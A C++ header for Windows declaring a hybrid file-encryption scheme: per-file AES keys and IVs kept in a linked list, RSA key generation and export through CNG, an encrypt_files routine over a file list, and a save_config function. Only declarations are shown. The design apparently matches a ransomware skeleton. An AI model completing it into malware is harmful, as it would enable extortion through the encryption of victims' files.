#pragma once
#include "common.h"
#include "tools.h"

typedef struct _AES_KEY_DIR {
	char file_path[MAX_PATH];
	BYTE iv[16];
	BYTE civ[16];
	BYTE aes[1024];
	DWORD aes_length;
	DWORD block_len;
	_AES_KEY_DIR* next;
} AES_KEY_DIR, * pAES_KEY_DIR;

void print_byte(PBYTE data, DWORD size);
void print_error(const char* e, NTSTATUS x);
bool generate_asymmetric_key(NCRYPT_PROV_HANDLE* handle, NCRYPT_KEY_HANDLE* key, LPCWSTR name);
bool export_key(NCRYPT_KEY_HANDLE* key, LPVOID buff, DWORD* buffsize, LPCWSTR type = BCRYPT_RSAPUBLIC_BLOB);
bool import_asymmetric_key(NCRYPT_PROV_HANDLE* handle, NCRYPT_KEY_HANDLE* key, DWORD buffer_size, LPVOID buffer, LPCWSTR type = BCRYPT_RSAPUBLIC_BLOB);
bool generate_symmetric_key(BCRYPT_ALG_HANDLE* alg_handle, BCRYPT_KEY_HANDLE* key_handle, LPVOID key_buff, DWORD* buff_size, LPVOID iv, DWORD* iv_size);
bool encrypt_files(pFileLinkedList file_head, pAES_KEY_DIR& key_head);
bool save_config(pAES_KEY_DIR key_head, pFileLinkedList file_tail, NCRYPT_KEY_HANDLE& key);
